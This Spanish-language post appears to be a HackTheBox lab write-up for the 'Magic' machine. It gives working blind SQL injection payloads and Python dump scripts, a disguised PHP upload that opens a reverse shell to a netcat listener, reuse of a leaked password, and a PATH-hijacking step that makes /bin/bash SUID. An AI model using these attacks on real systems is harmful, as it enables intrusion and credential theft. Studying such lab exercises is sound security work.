+++ 
draft = false
date = 2026-01-31T01:35:22Z
title = "Magic Machine - HackTheBox"
description = "Esta es una máquina de nivel medio de la plataforma HackThebox, en la cual se tocan varias vulnerabilidades, como SQLi, file upload y PathHijacking"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-------------------------
- Tags: #Machine #Linux #Medium #SQLI #Fileupload #PathHijacking
----------------
# Introducción

Esta es una máquina Linux que aloja un servidor web con una aplicación que permite subir imágenes una vez autenticado. Debido a que no contamos con credenciales válidas, se busca una vía de acceso alternativa, logrando un bypass del login mediante una vulnerabilidad de inyección SQL (SQLi).

Una vez confirmada la existencia del SQLi, se procede a dumpear la base de datos utilizando la técnica *boolean-based*, encontrando así las credenciales del administrador de la aplicación web.

Ya dentro del panel de subida de imágenes, se identifica el directorio donde se almacenan los archivos mediante fuzzing con `FUZZ`. Posteriormente, se realiza la subida de un archivo malicioso en PHP, obteniendo ejecución remota de comandos y acceso inicial a la máquina víctima.

Con la contraseña obtenida desde la base de datos, se prueba la reutilización de credenciales a nivel de sistema, logrando migrar a otro usuario.

Finalmente, para la escalada de privilegios, se detecta un binario inusual con permisos SUID. Al analizarlo con `strings`, se observa que utiliza los binarios `cat`, `ldisk` y `lshw` sin especificar rutas absolutas, lo que permite realizar un ataque de path hijacking. Mediante la creación de un binario malicioso, se asignan permisos SUID a `/bin/bash`, obteniendo así privilegios de superusuario y comprometiendo completamente el sistema.
# Enumeración Nmap

Realizamos un escaneo de los puertos, encontrando como resultado el puerto `80` abierto, que está corriendo el servicio `HTTP`, y el puerto `22` corriendo `SSH`

```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.233 -oG allPorts
```

<img src="/images/Pasted image 20260129185051.png" style="width:100%; height:auto; display:block; margin:auto;">

En cuenta a las versiones de estos servicios, tenemos las siguiente

<img src="/images/Pasted image 20260129185134.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración HTTP

La página web es súper simple, tiene un apartado principal, y uno de `login`

<img src="/images/Pasted image 20260129235839.png" style="width:100%; height:auto; display:block; margin:auto;">

Si vamos a `/login`, vemos que necesitamos proporcionar un usuario y contraseña

<img src="/images/Pasted image 20260129235927.png" style="width:100%; height:auto; display:block; margin:auto;">

Si utilizamos un usuario cualquiera `test:test`, vemos el siguiente mensaje

<img src="/images/Pasted image 20260129235950.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora si mandamos `test':test`, el primer parámetro con una comilla `'`, vemos que deja de aparecer el mensaje de error, por tanto parece ser vulnerable a SQLi

# Explotando SQLi

Interceptamos la petición con `Burpsuite`, y ahora probamos el siguiente payload para bypassear la página de `login`

```bash
username=test&password=test' or '1'='1'--+-
```

Enviándolo, vemos que nos redirige hacia `upload.php`

<img src="/images/Pasted image 20260130001155.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto la web es vulnerable a SQLi, probaremos con una igualdad errónea, para ver si nos muestra un mensaje diferente

```bash
username=test&password=test' or '1'='2'--+-
```

y vemos que aparece nuevamente el error de `Javascript`

```javascript
<script>alert('Wrong Username or Password')</script>
```

<img src="/images/Pasted image 20260130001457.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto tenemos una vía para enumerar la base de datos

## Obteniendo nombre de la bases de datos

Para obtener el nombre de la base de datos, tenemos el siguiente payload

**Nota:** Utilizamos `BINARY`, para hacer que la petición sea case-sensitive.

```bash
username=test&password=test' or substring(BINARY database(),1,1)='a'--+-
```

Vemos que nos aparece el mensaje de error, por tanto sabemos que el primer carácter del nombre de la base de datos no es `a`

Si mandamos el siguiente payload, vemos que desaparece el mensaje de error, por tanto el primer carácter es una `M`

```bash
username=test&password=test' or substring(BINARY database(),1,1)='M'--+-
```

Para poder encontrar todos los valores del nombre de la base de datos, tenemos el siguiente script en Python

```python
import requests
import string
import os

baseURL = "http://10.129.7.48"
param = "/login.php"
characters = string.ascii_letters + string.digits + string.punctuation
box = ""

# Obtener cookies
s = requests.Session()

for pos in range(1,6):
   for char in (characters):

      payload = f"test' or substring(BINARY database(),{pos},1)='{char}'-- -"
      data = {"username": "test", "password": payload }
      r = s.post(baseURL + param,data=data)
      print(payload)
      if not "Wrong" in r.text:
         os.system("clear")
         box = box + char
         print(box)
         break
```

Utilizandolo encontramos que el nombre de la base de datos es `Magic`

## Obteniendo las tablas de Magic

El payload para encontrar las tablas de la base de datos `Magic` es el siguiente

```bash
test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='Magic'),{pos},1)='{char}'--+-
```

Por tanto, podemos crear un script en Python, para que nos devuelva todos los nombres de las tablas

```python
import requests
import string
import os

baseURL = "http://10.129.7.48"
param = "/login.php"
characters = ',' + string.ascii_letters + string.digits + string.punctuation
box = ""

# Obtener cookies
s = requests.Session()

for pos in range(1,300):
   for char in (characters):

      payload = f"test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='Magic'),{pos},1)='{char}'-- -"
      data = {"username": "test", "password": payload }
      r = s.post(baseURL + param,data=data)
      print(payload)
      if not "Wrong" in r.text:
         os.system("clear")
         box = box + char
         print(box)
         break
```

y el resultado es que sólo existe la tabla `login`

## Obteniendo las columnas de la tabla login

Para obtener las columnas de la tabla `login`, tenemos el siguiente payload

```bash
test' or substring((select group_concat(column_name) from information_schema.columns where table_schema='Magic' and table_name='login'),{pos},1)='{char}'--+-
```

Para obtener todas las columnas, podemos utilizar el siguiente script

```python
import requests
import string
import os

baseURL = "http://10.129.7.48"
param = "/login.php"
characters = ',' + string.ascii_letters + string.digits + string.punctuation
box = ""

# Obtener cookies
s = requests.Session()

for pos in range(1,300):
   for char in (characters):

      payload = f"test' or substring((select group_concat(column_name) from information_schema.columns where table_schema='Magic' and table_name='login'),{pos},1)='{char}'-- -"
      data = {"username": "test", "password": payload }
      r = s.post(baseURL + param,data=data)
      print(payload)
      if not "Wrong" in r.text:
         os.system("clear")
         box = box + char
         print(box)
         break
```

Encontramos las columnas `id`,`username` y `password`

## Obteniendo los datos user y pass

Para obtener los datos de la columna `username`, y la columna `password`. Podemos utilizar el siguiente payload

```bash
import requests
import string
import os
import sys

baseURL = "http://10.129.7.48"
param = "/login.php"
characters = ','+ ':' + string.ascii_letters + string.digits + string.punctuation
box = ""
END = 0
# Obtener cookies
s = requests.Session()

for pos in range(1,300):
   END = END + 1
   for char in (characters):

      payload = f"test' or substring((select group_concat(BINARY username, ':', BINARY password) from login),{pos},1)='{char}'-- -"
      data = {"username": "test", "password": payload }
      r = s.post(baseURL + param,data=data)
      print(payload)
      if END > 1:
         os.system("clear")
         print("El usuario y contraseña es: ",box)
         sys.exit()

      if not "Wrong" in r.text:
         os.system("clear")
         box = box + char
         print(box)
         END = 0
         break
```

Utilizando el script obtenemos las siguientes credenciales: `admin:Th3s3usW4sK1ng`

# Explotando File Upload

Utilizando las credenciales obtenidas, nos podemos loguear en la página de `login`

<img src="/images/Pasted image 20260130005105.png" style="width:100%; height:auto; display:block; margin:auto;">

y nos redirige hacia `upload.php`, donde podemos subir imágenes

<img src="/images/Pasted image 20260130005319.png" style="width:100%; height:auto; display:block; margin:auto;">

Probando con una imagen cualquier `.jpeg`, vemos que dice que se ha subido exitosamente, pero no sabemos a qué directorio se sube

<img src="/images/Pasted image 20260130005608.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto vamos a realizar un fuzzeo, para encontrar el directorio que alberga las imágenes que subimos, para ello usaremos `FUFF`, de la siguiente manera 

```bash
ffuf -u http://10.129.7.48/images/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fl 60
```

y encontramos dos directorios `images`, y `assets`

<img src="/images/Pasted image 20260130005708.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora si realizamos otro fuzzeo en el directorio `/images`, de la siguiente forma

```bash
ffuf -u http://10.129.7.48/images/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs 276
```

Encontramos el directorio `uploads`

<img src="/images/Pasted image 20260130005929.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora si vamos al directorio `/images/uploads/image.jpeg`, que es el foto que subimos previamente, encontramos que ahí se encuentra

<img src="/images/Pasted image 20260130010125.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto sabemos el directorio que alberga los archivos que estamos subiendo.

Ahora si intentamos subir un archivo vacío, nos aparece el siguiente mensaje de error

<img src="/images/Pasted image 20260130010220.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto interceptaremos la petición con `burpsuite`, para ver cómo se tramita.

Vemos que si la mandamos sin más, se sube correctamente

<img src="/images/Pasted image 20260130010330.png" style="width:100%; height:auto; display:block; margin:auto;">

Pero si cambiamos el `filename`, a otro que no sea `JPG`, `JPEG` o `PNG`, da un mensaje de error.

<img src="/images/Pasted image 20260130010429.png" style="width:100%; height:auto; display:block; margin:auto;">

Probaremos usar doble extensión, e insertaremos código `PHP` al final del todo, para verificar si se interpreta.

para ello utilizaremos el siguiente código

```php
<?php if(5>3) echo "Vulnerable"; ?>
```

y en `filename`, pondremos `test.php.jpg`

de la siguiente forma

<img src="/images/Pasted image 20260130010728.png" style="width:100%; height:auto; display:block; margin:auto;">

y el código al final del todo

<img src="/images/Pasted image 20260130010741.png" style="width:100%; height:auto; display:block; margin:auto;">

y ahora vamos hacia `/images/uploads/test.php.jpg` y vemos que el código `PHP` fue interpretado, por tanto tenemos ejecución de código

<img src="/images/Pasted image 20260130010820.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora podemos subir un archivo malicioso, que nos envíe una consola interactiva hacia un puerto en el que estaremos en escucha con `nc`

```bash
nc -nlvp 4443
```

y ejecutaremos el código de `Pentestmonkey` https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php

Subimos el archivo `shell.php.jgp`, y ahora lo ejecutamos

<img src="/images/Pasted image 20260130011120.png" style="width:100%; height:auto; display:block; margin:auto;">

y conseguimos la consola interactiva en nuestro terminal

<img src="/images/Pasted image 20260130011149.png" style="width:100%; height:auto; display:block; margin:auto;">

# Movimiento lateral

Si nos vamos al directorio `/home`, encontramos que existe el usuario `theseus`.

Además si vemos el `/etc/passwd`, y buscamos por los usuarios que usen `bash`, vemos que aparece solamente `root` y `theseus`

<img src="/images/Pasted image 20260130011332.png" style="width:100%; height:auto; display:block; margin:auto;">

Como obtuvimos la contraseña de `admin`, en el dumpeo de la base de datos, probaremos si es que se reutiliza la contraseña, probamos con `theseus:Th3s3usW4sK1ng`

Y vemos que migramos de usuario exitosamente

<img src="/images/Pasted image 20260130011511.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora con el nuevo usuario podemos leer la `user.txt`

<img src="/images/Pasted image 20260130011556.png" style="width:100%; height:auto; display:block; margin:auto;">
# Escalando privilegios

Para escalar privilegios buscamos por archivos con permisos SUID

```bash
find / -perm -4000 2>/dev/null
```

y encontramos el binario `sysinfo`, que no es usual

<img src="/images/Pasted image 20260130011831.png" style="width:100%; height:auto; display:block; margin:auto;">

Al correrlo nos muestra mucho output, pero no da opción a nada

<img src="/images/Pasted image 20260130011926.png" style="width:100%; height:auto; display:block; margin:auto;">


Le hacemos un `strings`, para ver los caracteres legibles, en búsqueda de comprender mejor el binario

```bash
strings /bin/sysinfo
```

## Explotando PathHijacking

y encontramos las siguientes líneas interesantes

<img src="/images/Pasted image 20260130012043.png" style="width:100%; height:auto; display:block; margin:auto;">

Vemos que utiliza `lshw`, `fdisk` y `cat`, sin proporcionar la ruta absoluta, por tanto es vulnerable a #PathHijacking 

Nos dirigiremos al directorio `/tmp`, y ahí crearemos el archivo `lshw`

```bash
touch lshw
```

y posteriormente agregaremos el contenido para cambiar `/bin/bash` a suid

```bash
echo "chmod u+s /bin/bash" >> /tmp/lshw
```

<img src="/images/Pasted image 20260130012615.png" style="width:100%; height:auto; display:block; margin:auto;">

Le damos permisos de ejecución para todos los usuarios

```bash
chmod +x /tmp/lshw
```

y cambiamos el `PATH`, de la siguiente forma

```bash
export PATH=/tmp:$PATH
```

Ahora volvemos a correr el binario `/bin/sysinfo`

y si vemos si ha cambiado `/bin/bash`, tenemos que ahora es `SUID`

<img src="/images/Pasted image 20260130013110.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto ahora podemos hacer el siguiente comando para tener privilegios de `root`

```bash
bash -p
```

y tenemos privilegios máximos en el sistema, permitiéndonos poder leer la `root.txt` y comprometer totalmente la máquina víctima.

<img src="/images/Pasted image 20260130013215.png" style="width:100%; height:auto; display:block; margin:auto;">

